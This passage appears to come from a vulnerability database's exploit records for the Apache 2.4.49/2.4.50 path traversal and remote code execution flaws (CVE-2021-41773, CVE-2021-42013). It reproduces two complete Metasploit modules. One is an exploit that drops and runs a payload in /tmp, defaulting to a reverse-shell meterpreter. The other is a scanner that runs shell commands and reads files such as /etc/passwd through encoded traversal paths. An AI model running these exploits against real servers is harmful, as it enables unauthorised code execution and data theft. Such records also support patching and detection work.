response, no command output\'))\n\n          return\n        end\n        print_line(received)\n      end\n    end\n  end\nend\n', 'sourceHref': 'https://0day.today/exploit/36952', 'cvss': {'score': 7.5, 'vector': 'AV:N/AC:L/Au:N/C:P/I:P/A:P'}, 'vhref': 'https://vulners.com/zdt/1337DAY-ID-36952'}
{'lastseen': '2021-10-25T17:32:29', 'description': '', 'published': '2021-10-25T00:00:00', 'type': 'packetstorm', 'title': 'Apache 2.4.49 / 2.4.50 Traversal / Remote Code Execution', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-41773', 'CVE-2021-42013'], 'modified': '2021-10-25T00:00:00', 'id': 'PACKETSTORM:164629', 'href': 'https://packetstormsecurity.com/files/164629/Apache-2.4.49-2.4.50-Traversal-Remote-Code-Execution.html', 'sourceData': '`##  \n# This module requires Metasploit: https://metasploit.com/download  \n# Current source: https://github.com/rapid7/metasploit-framework  \n##  \n  \nclass MetasploitModule < Msf::Exploit::Remote  \nRank = ExcellentRanking  \n  \ninclude Msf::Exploit::EXE  \ninclude Msf::Exploit::FileDropper  \ninclude Msf::Exploit::Remote::CheckModule  \ninclude Msf::Exploit::Remote::HttpClient  \n  \ndef initialize(info = {})  \nsuper(  \nupdate_info(  \ninfo,  \n\'Name\' => \'Apache 2.4.49/2.4.50 Traversal RCE\',  \n\'Description\' => %q{  \nThis module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).  \nIf files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,  \nit can be used to execute arbitrary commands (Remote Command Execution).  \nThis vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).  \n},  \n\'References\' => [  \n[\'CVE\', \'2021-41773\'],  \n[\'CVE\', \'2021-42013\'],  \n[\'URL\', \'https://httpd.apache.org/security/vulnerabilities_24.html\'],  \n[\'URL\', \'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse\'],  \n[\'URL\', \'https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml\'],  \n[\'URL\', \'https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74\'],  \n[\'URL\', \'https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis\']  \n],  \n\'Author\' => [  \n\'Ash Daulton\', # Vulnerability discovery  \n\'Dhiraj Mishra\', # Metasploit auxiliary module  \n\'mekhalleh (RAMELLA Sébastien)\' # Metasploit exploit module (Zeop Entreprise)  \n],  \n\'DisclosureDate\' => \'2021-05-10\',  \n\'License\' => MSF_LICENSE,  \n\'Platform\' => [\'unix\', \'linux\'],  \n\'Arch\' => [ARCH_CMD, ARCH_X64, ARCH_X86],  \n\'DefaultOptions\' => {  \n\'CheckModule\' => \'auxiliary/scanner/http/apache_normalize_path\',  \n\'Action\' => \'CHECK_RCE\',  \n\'RPORT\' => 443,  \n\'SSL\' => true  \n},  \n\'Targets\' => [  \n[  \n\'Automatic (Dropper)\',  \n{  \n\'Platform\' => \'linux\',  \n\'Arch\' => [ARCH_X64, ARCH_X86],  \n\'Type\' => :linux_dropper,  \n\'DefaultOptions\' => {  \n\'PAYLOAD\' => \'linux/x64/meterpreter/reverse_tcp\',  \n\'DisablePayloadHandler\' => \'false\'  \n}  \n}  \n],  \n[  \n\'Unix Command (In-Memory)\',  \n{  \n\'Platform\' => \'unix\',  \n\'Arch\' => ARCH_CMD,  \n\'Type\' => :unix_command,  \n\'DefaultOptions\' => {  \n\'PAYLOAD\' => \'cmd/unix/generic\',  \n\'DisablePayloadHandler\' => \'true\'  \n}  \n}  \n],  \n],  \n\'DefaultTarget\' => 0,  \n\'Notes\' => {  \n\'Stability\' => [CRASH_SAFE],  \n\'Reliability\' => [REPEATABLE_SESSION],  \n\'SideEffects\' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]  \n}  \n)  \n)  \n  \nregister_options([  \nOptEnum.new(\'CVE\', [true, \'The vulnerability to use\', \'CVE-2021-42013\', [\'CVE-2021-41773\', \'CVE-2021-42013\']]),  \nOptInt.new(\'DEPTH\', [true, \'Depth for Path Traversal\', 5]),  \nOptString.new(\'TARGETURI\', [true, \'Base path\', \'/cgi-bin\'])  \n])  \nend  \n  \ndef cmd_unix_generic?  \ndatastore[\'PAYLOAD\'] == \'cmd/unix/generic\'  \nend  \n  \ndef execute_command(command, _opts = {})  \ntraversal = pick_payload * datastore[\'DEPTH\'] << \'/bin/sh\'  \n  \nuri = normalize_uri(datastore[\'TARGETURI\'], traversal.to_s)  \nresponse = send_request_raw({  \n\'method\' => Rex::Text.rand_text_alpha(3..4),  \n\'uri\' => uri,  \n\'data\' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{command}"  \n})  \nif response && response.body  \nreturn response.body  \nend  \n  \nfalse  \nend  \n  \ndef message(msg)  \n"#{@proto}://#{datastore[\'RHOST\']}:#{datastore[\'RPORT\']} - #{msg}"  \nend  \n  \ndef pick_payload  \ncase datastore[\'CVE\']  \nwhen \'CVE-2021-41773\'  \npayload = \'.%2e/\'  \nwhen \'CVE-2021-42013\'  \npayload = \'.%%32%65/\'  \nelse  \npayload = \'\'  \nend  \n  \npayload  \nend  \n  \ndef exploit  \n@proto = (ssl ? \'https\' : \'http\')  \n  \nif (!check.eql? Exploit::CheckCode::Vulnerable) && !datastore[\'ForceExploit\']  \nfail_with(Failure::NotVulnerable, \'The target is not exploitable.\')  \nend  \n  \nprint_status(message("Attempt to exploit for #{datastore[\'CVE\']}"))  \ncase target[\'Type\']  \nwhen :linux_dropper  \n  \nfile_name = "/tmp/#{Rex::Text.rand_text_alpha(4..8)}"  \ncmd = "echo #{Rex::Text.encode_base64(generate_payload_exe)} | base64 -d > #{file_name}; chmod +x #{file_name}; #{file_name}; rm -f #{file_name}"  \n  \nprint_status(message("Sending #{datastore[\'PAYLOAD\']} command payload"))  \nvprint_status(message("Generated command payload: #{cmd}"))  \n  \nexecute_command(cmd)  \n  \nregister_file_for_cleanup file_name  \nwhen :unix_command  \nvprint_status(message("Generated payload: #{payload.encoded}"))  \n  \nif !cmd_unix_generic?  \nexecute_command(payload.encoded)  \nelse  \nreceived = execute_command(payload.encoded.to_s)  \n  \nprint_warning(message(\'Dumping command output in response\'))  \nif !received  \nprint_error(message(\'Empty response, no command output\'))  \n  \nreturn  \nend  \nprint_line(received)  \nend  \nend  \nend  \nend  \n`\n', 'sourceHref': 'https://packetstormsecurity.com/files/download/164629/apache_normalize_path_rce.rb.txt', 'cvss': {'score': 7.5, 'vector': 'AV:N/AC:L/Au:N/C:P/I:P/A:P'}, 'vhref': 'https://vulners.com/packetstorm/PACKETSTORM:164629'}
{'lastseen': '2022-02-01T00:00:00', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-41773', 'CVE-2021-42013'], 'description': 'Apache HTTP Server\n\n  What is it?\n  -----------\n\n  The Apache HT...', 'modified': '2021-10-21T12:52:18', 'published': '2021-10-12T22:02:09', 'id': '88EB009A-EEFF-52B7-811D-A8A8C8DE8C81', 'href': '', 'type': 'githubexploit', 'title': 'Exploit for Path Traversal in Apache Http Server', 'cvss': {'score': 7.5, 'vector': 'AV:N/AC:L/Au:N/C:P/I:P/A:P'}, 'privateArea': 1, 'vhref': 'https://vulners.com/githubexploit/88EB009A-EEFF-52B7-811D-A8A8C8DE8C81'}
{'lastseen': '2021-12-14T04:38:21', 'description': 'This module scans for an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773). If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled, it can be used to execute arbitrary commands (Remote Command Execution). This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).\n', 'published': '2021-10-06T17:00:59', 'type': 'metasploit', 'title': 'Apache 2.4.49/2.4.50 Traversal RCE scanner', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-41773', 'CVE-2021-42013'], 'modified': '2021-10-22T16:38:03', 'id': 'MSF:AUXILIARY/SCANNER/HTTP/APACHE_NORMALIZE_PATH/', 'href': 'https://www.rapid7.com/db/modules/auxiliary/scanner/http/apache_normalize_path/', 'sourceData': '##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        \'Name\' => \'Apache 2.4.49/2.4.50 Traversal RCE scanner\',\n        \'Description\' => %q{\n          This module scans for an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).\n          If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,\n          it can be used to execute arbitrary commands (Remote Command Execution).\n          This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).\n        },\n        \'References\' => [\n          [\'CVE\', \'2021-41773\'],\n          [\'CVE\', \'2021-42013\'],\n          [\'URL\', \'https://httpd.apache.org/security/vulnerabilities_24.html\'],\n          [\'URL\', \'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse\'],\n          [\'URL\', \'https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml\'],\n          [\'URL\', \'https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74\'],\n          [\'URL\', \'https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis\']\n        ],\n        \'Author\' => [\n          \'Ash Daulton\', # Vulnerability discovery\n          \'Dhiraj Mishra\', # Metasploit auxiliary module\n          \'mekhalleh (RAMELLA Sébastien)\' # Metasploit exploit module (Zeop Entreprise)\n        ],\n        \'DisclosureDate\' => \'2021-05-10\',\n        \'License\' => MSF_LICENSE,\n        \'DefaultOptions\' => {\n          \'RPORT\' => 443,\n          \'SSL\' => true\n        },\n        \'Notes\' => {\n          \'Stability\' => [CRASH_SAFE],\n          \'Reliability\' => [REPEATABLE_SESSION],\n          \'SideEffects\' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        },\n        \'Actions\' => [\n          [\n            \'CHECK_TRAVERSAL\',\n            {\n              \'Description\' => \'Check for vulnerability.\'\n            }\n          ],\n          [\n            \'CHECK_RCE\',\n            {\n              \'Description\' => \'Check for RCE (if mod_cgi is enabled).\'\n            }\n          ],\n          [\n            \'READ_FILE\',\n            {\n              \'Description\' => \'Read file on the remote server.\'\n            }\n          ]\n        ],\n        \'DefaultAction\' => \'CHECK_TRAVERSAL\'\n      )\n    )\n\n    register_options([\n      OptEnum.new(\'CVE\', [true, \'The vulnerability to use\', \'CVE-2021-42013\', [\'CVE-2021-41773\', \'CVE-2021-42013\']]),\n      OptInt.new(\'DEPTH\', [true, \'Depth for Path Traversal\', 5]),\n      OptString.new(\'FILEPATH\', [false, \'File you want to read\', \'/etc/passwd\']),\n      OptString.new(\'TARGETURI\', [true, \'Base path\', \'/cgi-bin\'])\n    ])\n  end\n\n  def exec_traversal(cmd)\n    send_request_raw({\n      \'method\' => Rex::Text.rand_text_alpha(3..4),\n      \'uri\' => normalize_uri(datastore[\'TARGETURI\'], @traversal.to_s),\n      \'data\' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{cmd}"\n    })\n  end\n\n  def message(msg)\n    "#{@proto}://#{datastore[\'RHOST\']}:#{datastore[\'RPORT\']} - #{msg}"\n  end\n\n  def pick_payload\n    case datastore[\'CVE\']\n    when \'CVE-2021-41773\'\n      payload = \'.%2e/\'\n    when \'CVE-2021-42013\'\n      payload = \'.%%32%65/\'\n    else\n      payload = \'\'\n    end\n\n    payload\n  end\n\n  def read_traversal\n    send_request_raw({\n      \'method\' => \'GET\',\n      \'uri\' => normalize_uri(@target_uri, @traversal.to_s)\n    })\n  end\n\n  def run_host(ip)\n    @proto = (ssl ? \'https\' : \'http\')\n\n    case action.name\n    when \'CHECK_TRAVERSAL\'\n      @target_uri = datastore[\'TARGETURI\']\n      @traversal = pick_payload * datastore[\'DEPTH\'] << \'/etc/passwd\'\n\n      response = read_traversal\n      unless response\n        print_error(message(\'No response, target seems down.\'))\n\n        return Exploit::CheckCode::Unknown\n      end\n\n      if response.code == 200 && response.body.include?(\'root:x:0:0:\')\n        print_good(message("The target is vulnerable to #{datastore[\'CVE\']}."))\n\n        vprint_status("Obtained HTTP response code #{response.code}.")\n        report_vuln(\n          host: target_host,\n          name: name,\n          refs: references\n        )\n\n        return Exploit::CheckCode::Vulnerable\n      end\n      print_error(message("The target is not vulnerable to #{datastore[\'CVE\']}."))\n\n      return Exploit::CheckCode::Safe\n    when \'CHECK_RCE\'\n      @traversal = pick_payload * datastore[\'DEPTH\'] << \'/bin/sh\'\n      rand_str = Rex::Text.rand_text_alpha(4..8)\n\n      response = exec_traversal("echo #{rand_str}")\n      unless response\n        print_error(message(\'No response, target seems down.\'))\n\n        return Exploit::CheckCode::Unknown\n      end\n\n      if response.code == 200 && response.body.include?(rand_str)\n        print_good(message("The target is vulnerable to #{datastore[\'CVE\']} (mod_cgi is enabled)."))\n        report_vuln(\n          host: target_host,\n          name: name,\n          refs: references\n        )\n\n        return Exploit::CheckCode::Vulnerable\n      end\n      print_error(message("The target is not vulnerable to #{datastore[\'CVE\']} (requires mod_cgi to be enabled)."))\n\n      return Exploit::CheckCode::Safe\n    when \'READ_FILE\'\n      fail_with(Failure::BadConfig, \'File path option is empty!\') if !datastore[\'FILEPATH\'] || datastore[\'FILEPATH\'].empty?\n\n      @target_uri = datastore[\'TARGETURI\']\n      @traversal = pick_payload * datastore[\'DEPTH\'] << datastore[\'FILEPATH\']\n\n      response = read_traversal\n      unless response\n        print_error(message(\'No response, target seems down.\'))\n\n        return Exploit::CheckCode::Unknown\n      end\n\n      vprint_status("Obtained HTTP response code #{response.code}.")\n      if response.code == 500\n        print_warning(message("The target is vulnerable to #{datastore[\'CVE\']} (mod_cgi is enabled)."))\n        report_vuln(\n          host: target_host,\n          name: name,\n          refs: references\n        )\n      end\n\n      if response.code == 500 || response.body.empty?\n        print_error(\'Nothing was downloaded\')\n\n        return Exploit::CheckCode::Vulnerable if response.code == 500\n      end\n\n      if response.code == 200\n        vprint_good("#{peer} \\n#{response.body}")\n        path = store_loot(\n          \'apache.traversal\',\n          \'application/octet-stream\',\n          ip,\n          response.body,\n          datastore[\'FILEPATH\']\n        )\n        print_good("File saved in: #{path}")\n\n        report_vuln(\n          host: target_host,\n          name: name,\n          refs: references\n        )\n\n        return Exploit::CheckCode::Vulnerable\n      end\n\n      return Exploit::CheckCode::Safe\n    end\n  end\nend\n', 'sourceHref': 'https://github.com/rapid7/metasploit-framework/blob/master//modules/auxiliary/scanner/http/apache_normalize_path.rb', 'cvss': {'score': 7.5, 'vector': 'AV:N/AC:L/Au:N/C:P/I:P/A:P'}, 'vhref': 'https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_NORMALIZE_PATH/'}
{'lastseen': '2022-02-01T00:00:00', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-41773'], 'description': '# CVE-2021-41773\n## 🐛 Path traversal and file disclosure vulnera...', 'modified': '2021-10-21T07:26:16', 'published': '2021-10-15T21:38:48', 'id': '987C6FDB-3E70-5FF5-AB5B-D50065D27594', 'href': '', 'type': 'githubexploit', 'title': 'Exploit for Path Traversal in Apache Http Server', 'cvss': {'score': 4.3, 'vector': 'AV:N/AC:M/Au:N/C:P/I:N/A:N'}, 'privateArea': 1, 'vhref': 'https://vulners.com/githubexploit/987C6FDB-3E70-5FF5-AB5B-D50065D27594'}
